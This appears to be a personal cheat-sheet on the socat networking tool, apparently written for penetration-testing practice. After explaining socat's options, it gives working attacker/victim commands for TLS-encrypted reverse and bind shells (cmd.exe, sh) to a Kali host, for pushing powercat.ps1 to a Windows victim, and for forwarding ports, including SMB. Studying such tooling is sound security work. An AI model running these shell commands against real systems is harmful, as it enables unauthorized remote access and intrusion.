# `socat`
# like `netcat`, but a little more
# see also: https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/
#           https://blog.stalkr.net/2015/12/from-remote-shell-to-remote-terminal.html
#           https://fossies.org/linux/socat/EXAMPLES

# notice: all options are case-insensitive

socat - TCP4:google.com:80
# so the way this works is, it connects exactly TWO fd together.
# it opens them in the order listed; each one blocks until it is open for read
# this means if you open a tcp connection before a file, 
# you won't see the file read error until after the tcp connection has succeeded
# `-` means forward all stdio (since `FD:0 FD:1 FD:2` would be listing too many fds)
# `tcp4:google.com:80` open as second fd
# NOTICE: order of fd doesnt matter, only their read/write status.

# it goes in phases like this: open->read->close
# basically all fds get opened
# then all fds get read, if they are of a type that can be read (and is awaiting write)
# the first fd to return read data is appended to [all] writable fds until they are all done reading
# then all fds get closed.

# so its important to understand which FDs are read-only, read-write, or write-only.
# additionally, each fd can take options given as a comma-separated list
# which affect its read/write-ability
# NOTICE: socat ASSUMES bi-directional by default;
#         to use options like `wronly`, you must specify uni-directional mode,
#         or you will get an error like "Bad file descriptor".
#         so to fix this specify the direction of flow (order of FD now matters!)
#           where `-u` means read->write
#           where `-U` means write<-read
#         NOTICE: by using these, you don't have to specify `rwonly`/`wronly`
# NOTICE: all the =1 boolean options can be shorthanded ie. `wronly=1` same as `wronly`
# NOTICE: order of options matters.
#         use `create` first before `trunc` and `unlink` to avoid error "No such file or directory"
# ie. `OPEN:<x>` followed by `creat=1`,`append=1`,`rdonly=1`,`wronly=1`
#     `create: ` file must NOT exist or throws error. opens for write-only.
#     `file:` file must exist or throws error
#     `file:,creat=1` works whether or not file exists
#     `open:` file must exist or throws error
#     `open:,creat=1` works whether or not file exists
# ie. `user=`,`group=`,`mode=`,
#     `binary` disable implicit CRLF=>LF conversions (recognized by Cygwin windows client only)
#     `text` enable implicit CRLF=>LF conversions (recognized by Cygwin windows client only)
#     `seek=` begin read/write at offset
#     `unlink-early`, `unlink`, `unlink-late` delete file before open, after open, or after close,
#        warning: will throw error and abort if the file doesn't exist!
#     `trunc` truncate file to 0 bytes before opening it.
#     `creat=1` or `create`: create if file doesn't exist
#     `largefile` for files >2GB on 32-bit systems
#     `bind=<ip>` listen on specific interface
# there are even specific options for EXEC processes
# ie. `chroot=<dir>`, `setgid=`, `setuid=`, `su=`, `setsid`
#     `history=`,`noprompt`,`prompt=`,
#     `sighup`,`sigint`,`sigquit` forward these signals to process
#     `echoctl=1` echo control characters in hat notation e.g., ^C
#     `cr` convert LF to CRLF
#     `crnl` similar to cr above. will have to use carefully, if at all
# it has even more options for TCP4, TCP6, UDP, HTTP, and OPENSSL which makes it darn near 
# a fully-programmable socket server from cli configuration.
# can handle everything from mitm, proxying, echo server, broadcast/broker server, etc.
# even has TTY pseudo-terminal VT emulation features!
# you can even create/connect virtual network devices with `tun:`
# NOTICE: `,reuseaddr` is good with LISTEN commands because it 
#         allows other apps to bind to the same addr:port 
#         which also prevents that annoying issue where it won't unbind for like 30sec
#         after the listener crashes

# this will accept one incoming connection and pipe everything it receives to stdout

socat TCP4-LISTEN:6665 STDOUT

# `TCP4-LISTEN` is like `nc -l` and its read-write
# `STDOUT` is alias for `FD:1` (likewise, `STDIN`=>`FD:0`, `STDERR`=>`FD:2`) and its write-only

# this will accept many incoming connections, and pipe everything to a file called secret

socat -d -d TCP4-LISTEN:6665,fork file:secret

# `-d -d` is enabling verbose mode like `nc -v`
# `,fork` is enabling multiple inbound connections
# `file:` is forwarding recv to a file `./secret`
# `CREATE:` is alias for `FILE:<x>,creat=1,wronly=1` or `file:<x>,create,wronly=1`


# OPENSSL

# make a self-signed key + crt
# NOTICE: only server-side needs access to self-signed cert file
openssl req -x509 -days 365 -out a.crt -newkey rsa:4096 -nodes -keyout a.key
cat a.key a.crt > a.pem

# listen w/ encryption
socat OPENSSL-LISTEN:6665,bind=192.168.119.198,cert=a.pem,verify=0,fork EXEC:/bin/bash,STDERR

# `OPENSSL-LISTEN` uses encryption
# `cert= `identifies PEM format key+cert
# `verify=0` ignores self-signed cert. this is required on both client and server side.
# `EXEC:` forwards stdio to/from process `/bin/bash`
# `,STDERR` redirects stderr=>stdout (notice this is the option, different from fd by same name)

# client side analog

socat - OPENSSL:localhost:6665,verify=0

# notice no key is necessary on connecting side;
# yet i verified with tcpdump that both sides _are_ encrypted.
# this is how SSL works: asymmetric for handshake, then symmetric thereafter
# so the server's pubkey is all that is required; 
# it is transmitted to client on handshake,
# client then generates random shared secret,
# and it is able to encrypt this for server's eyes only using the pubkey,
# shared secret is then used for remainder of session.


# read from stdin, write to stdout
socat FD:0 FD:1

# read from stdin, write to file
socat -t3 FD:0 file:powercat.ps1,trunc
# `-t3` keeps listening for more read bytes until there has been no new data for 3 seconds, then closes
#       otherwise, it will close fairly immediately as no bytes are immediately queued/buffered for recv.

# transfer `powercat.ps1` from kali->windows with tls encryption over tcp/443
# kali (attacker; listener)
$ openssl req -x509 -days 365 -out a.crt -newkey rsa:4096 -nodes -keyout a.key
$ cat a.key a.crt > a.pem
$ sudo socat -U openssl-listen:443,bind=192.168.119.198,cert=a.pem,fork,verify=0,reuseaddr open:/usr/share/windows-resources/powercat/powercat.ps1

# windows (victim; connector)
C:\> socat -u openssl:192.168.119.198:443,verify=0 open:powercat.ps1,create,trunc


# or without encryption
# kali (attacker; listener; write<-read)
$ sudo socat -U tcp4-listen:80,bind=192.168.119.198,fork,reuseaddr open:/usr/share/windows-resources/powercat/powercat.ps1

# windows (victim; connector; read->write)
C:\> socat -u tcp4:192.168.119.198:80 open:powercat.ps1,create,trunc,binary





# use `socat` to create an encrypted reverse shell from windows->kali
# NOTICE: this ignores Ctl-c instead of forwarding them, but doesn't crash at least
# kali (attacker; listener)
$ openssl req -x509 -days 365 -out a.crt -newkey rsa:4096 -nodes -keyout a.key
$ cat a.key a.crt > a.pem
$ sudo socat -,raw,echoctl=0 openssl-listen:443,bind=192.168.119.198,cert=a.pem,verify=0,reuseaddr

# windows (victim; connector)
C:\> socat openssl:192.168.119.198:443,verify=0 exec:cmd.exe,pty,stderr,echo=0


# use `socat` to create an encrypted reverse shell from linux->kali
# NOTICE: this works VERY well! fwds Ctl-c, renders VIm/tmux, interactive prompts
# kali (attacker; listener)
$ openssl req -x509 -days 365 -out a.crt -newkey rsa:4096 -nodes -keyout a.key
$ cat a.key a.crt > a.pem
$ sudo socat -,raw,echo=0 openssl-listen:443,bind=192.168.119.198,cert=a.pem,verify=0,reuseaddr

# linux (victim; connector)
$ socat openssl:192.168.119.198:443,verify=0 exec:sh,pty,ctty,setsid,stderr,sane


# resizing tty from default 80x24
# on local side, get size of current window
$ stty -a
# on remote side, apply size to current tty 
# (or just make up a reasonable size and apply it, then resize your window bigger than that)
$ stty rows 40 cols 130



# create an encrypted bind shell on Windows. connect from Kali.
# kali (attacker; temporary listener)
$ sudo socat -U openssl-listen:443,bind=192.168.119.198,cert=a.pem,fork,verify=0,reuseaddr open:a.pem

# windows (victim; temporary connector)
C:\> socat.exe -u openssl:192.168.119.198:443,verify=0 create:a.pem
# windows (victim; listener)
C:\> socat.exe openssl-listen:8443,bind=192.168.198.10,cert=a.pem,fork,verify=0,reuseaddr exec:cmd.exe,pty,stderr,echo=0

# kali (attacker; connector)
$ sudo socat -,raw,echoctl=0 openssl:192.168.198.10:8443,verify=0 








# `pty` allocate a pseudo-tty (using one of two possible methods; auto-detected by env) instead of a simple socket
# `ctty` make this tty the controlling tty of the subprocess (seems ideal)
#        means this tty becomes the controlling terminal for the current process
#        which means /dev/tty will point to this terminal for the current process
#        which means interactive processes will read from /dev/tty and get this tty
#        so do this if there are interactive [password] prompts etc.
#        NOTE: only a "session leader" (parent-most proc in a session) can have a ctty
# `setsid` launch process as new root parent process
# `pipes` create a pair of unnamed pipes for IPC instead of a socket pair






# PORT FORWARDING
# Forward your 8083 to 62.41.90.2:443
$ socat TCP4-LISTEN:8083,fork TCP4:62.41.90.2:443

# re-route on windows
$ socat.exe tcp4-listen:8000,fork tcp4:127.0.0.1:445


---
# related tools: nc